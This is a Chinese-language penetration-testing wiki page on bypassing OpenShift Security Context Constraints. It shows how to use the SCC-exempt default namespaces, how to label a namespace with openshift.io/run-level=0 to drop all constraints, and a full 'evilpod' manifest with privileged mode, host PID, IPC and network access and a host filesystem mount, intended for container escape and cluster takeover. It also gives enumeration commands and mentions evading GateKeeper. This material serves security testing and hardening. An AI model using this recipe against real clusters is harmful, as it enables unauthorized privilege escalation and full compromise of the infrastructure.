# Openshift - SCC bypass

**该页面的原作者是** [**Guillaume**](https://www.linkedin.com/in/guillaume-chapela-ab4b9a196)

## 特权命名空间

默认情况下，SCC 不适用于以下项目：

- **default**
- **kube-system**
- **kube-public**
- **openshift-node**
- **openshift-infra**
- **openshift**

如果您在这些命名空间之一中部署 pod，将不会强制执行 SCC，从而允许部署特权 pod 或挂载主机文件系统。

## 命名空间标签

根据 RedHat 文档，有一种方法可以禁用 SCC 在您的 pod 上的应用。您需要至少拥有以下权限之一：

- 在此命名空间中创建命名空间并创建 pod
- 编辑命名空间并在此命名空间中创建 pod
```bash
$ oc auth can-i create namespaces
yes

$ oc auth can-i patch namespaces
yes
```
特定标签 `openshift.io/run-level` 使用户能够绕过应用程序的 SCCs。根据 RedHat 文档，当使用此标签时，该命名空间内的所有 pod 都不执行任何 SCCs，有效地移除了任何限制。

<figure><img src="../../../images/Openshift-RunLevel4.png" alt=""><figcaption></figcaption></figure>

## 添加标签

在您的命名空间中添加标签：
```bash
$ oc label ns MYNAMESPACE openshift.io/run-level=0
```
通过 YAML 文件创建带标签的命名空间：
```yaml
apiVersion: v1
kind: Namespace
metadata:
name: evil
labels:
openshift.io/run-level: 0
```
现在，在该命名空间中创建的所有新 pod 都不应具有任何 SCC

<pre class="language-bash"><code class="lang-bash"><strong>$ oc get pod -o yaml | grep 'openshift.io/scc'
</strong><strong>$
</strong></code></pre>

在没有 SCC 的情况下，您的 pod 定义没有任何限制。这意味着可以轻松创建恶意 pod 以逃逸到主机系统上。
```yaml
apiVersion: v1
kind: Pod
metadata:
name: evilpod
labels:
kubernetes.io/hostname: evilpod
spec:
hostNetwork: true #Bind pod network to the host network
hostPID: true #See host processes
hostIPC: true #Access host inter processes
containers:
- name: evil
image: MYIMAGE
imagePullPolicy: IfNotPresent
securityContext:
privileged: true
allowPrivilegeEscalation: true
resources:
limits:
memory: 200Mi
requests:
cpu: 30m
memory: 100Mi
volumeMounts:
- name: hostrootfs
mountPath: /mnt
volumes:
- name: hostrootfs
hostPath:
path:
```
现在，提升权限以访问主机系统并随后接管整个集群，获得“cluster-admin”权限变得更加容易。请查看以下页面中的 **Node-Post Exploitation** 部分：

{{#ref}}
../../kubernetes-security/attacking-kubernetes-from-inside-a-pod.md
{{#endref}}

### 自定义标签

此外，根据目标设置，可以像之前的攻击场景一样使用一些自定义标签/注释。即使不是专门为此而设计，标签也可以用于授予权限，限制或不限制特定资源。

如果您可以读取一些资源，请尝试查找自定义标签。以下是一些有趣的资源列表：

- Pod
- Deployment
- Namespace
- Service
- Route
```bash
$ oc get pod -o yaml | grep labels -A 5
$ oc get namespace -o yaml | grep labels -A 5
```
## 列出所有特权命名空间
```bash
$ oc get project -o yaml | grep 'run-level' -b5
```
## 高级利用

在 OpenShift 中，如前所示，拥有在带有 `openshift.io/run-level` 标签的命名空间中部署 pod 的权限，可以导致对集群的直接接管。从集群设置的角度来看，这一功能 **无法被禁用**，因为它是 OpenShift 设计的固有部分。

然而，像 **Open Policy Agent GateKeeper** 这样的缓解措施可以防止用户设置此标签。

为了绕过 GateKeeper 的规则并设置此标签以执行集群接管，**攻击者需要识别替代方法。**

## 参考文献

- [https://docs.openshift.com/container-platform/4.8/authentication/managing-security-context-constraints.html](https://docs.openshift.com/container-platform/4.8/authentication/managing-security-context-constraints.html)
- [https://docs.openshift.com/container-platform/3.11/admin_guide/manage_scc.html](https://docs.openshift.com/container-platform/3.11/admin_guide/manage_scc.html)
- [https://github.com/open-policy-agent/gatekeeper](https://github.com/open-policy-agent/gatekeeper)
